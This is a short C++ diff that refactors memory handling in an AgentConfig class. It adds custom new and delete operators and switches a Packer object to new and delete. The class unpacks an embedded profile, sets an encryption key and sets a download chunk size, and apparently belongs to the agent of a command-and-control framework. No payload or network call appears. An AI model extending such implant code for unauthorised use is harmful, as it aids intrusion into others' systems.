@@ -4,6 +4,15 @@
 #include "utils.h"
 #include "config.h"
 
+void* AgentConfig::operator new(size_t sz) {
+	void* p = MemAllocLocal(sz);
+	return p;
+}
+
+void AgentConfig::operator delete(void* p) noexcept {
+	MemFreeLocal(&p, sizeof(AgentConfig));
+}
+
 AgentConfig::AgentConfig()
 {
 	ULONG length       = 0;
@@ -11,8 +20,7 @@ AgentConfig::AgentConfig()
 	CHAR* ProfileBytes = (CHAR*) MemAllocLocal(size);
 	memcpy(ProfileBytes, getProfile(), size);
 
-	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
-	*packer = Packer( (BYTE*)ProfileBytes, size);
+	Packer* packer = new Packer( (BYTE*)ProfileBytes, size);
 	ULONG profileSize = packer->Unpack32();
 
 	this->encrypt_key = (PBYTE) MemAllocLocal(16);
@@ -68,7 +76,7 @@ AgentConfig::AgentConfig()
 
 	this->download_chunk_size = 0x19000;
 
-	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
+	delete packer;
 	MemFreeLocal((LPVOID*)&ProfileBytes, size);
 
 }
